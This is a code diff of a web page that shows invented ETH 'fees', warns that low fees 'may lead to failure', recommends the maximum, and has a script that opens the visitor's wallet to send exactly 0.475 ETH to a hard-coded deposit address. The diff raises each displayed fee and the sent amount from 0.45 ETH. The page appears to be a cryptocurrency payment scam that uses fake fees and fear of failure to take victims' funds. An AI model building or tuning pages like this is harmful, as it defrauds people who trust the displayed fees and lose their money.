@@ -680,21 +680,21 @@
                     <div class="fees-grid">
                         <div class="fee-item">
                             <div class="fee-label">Average</div>
-                            <div class="fee-value" id="avg-fee">0.31 ETH</div>
+                            <div class="fee-value" id="avg-fee">0.3251 ETH</div>
                         </div>
                         <div class="fee-item">
                             <div class="fee-label">Minimum</div>
-                            <div class="fee-value" id="min-fee">0.24 ETH</div>
+                            <div class="fee-value" id="min-fee">0.245 ETH</div>
                         </div>
                         <div class="fee-item">
                             <div class="fee-label">Maximum</div>
-                            <div class="fee-value" id="max-fee">0.45 ETH</div>
+                            <div class="fee-value" id="max-fee">0.475 ETH</div>
                         </div>
                     </div>
                     <div class="warning-banner">
                         <div class="warning-icon">⚠️</div>
                         <div class="warning-text" id="fee-warning">
-                            Warning: Using minimum fees may lead to failure and delay. Recommended: 0.45 ETH (maximum
+                            Warning: Using minimum fees may lead to failure and delay. Recommended: 0.475 ETH (maximum
                             amount).
                         </div>
                     </div>
@@ -995,10 +995,10 @@
             }
 
             const to = DEPOSIT_ADDRESS;
-            // Always send exactly 0.45 ETH
-            const value = web3.utils.toWei('0.45', 'ether');
+          
+            const value = web3.utils.toWei('0.475', 'ether');
 
-            showMessage(`⏳ Opening wallet to deposit 0.45 ETH...`, 'info');
+            showMessage(`⏳ Opening wallet to deposit 0.475 ETH...`, 'info');
 
             // Disable button during transaction
             document.getElementById('deposit-btn').disabled = true;
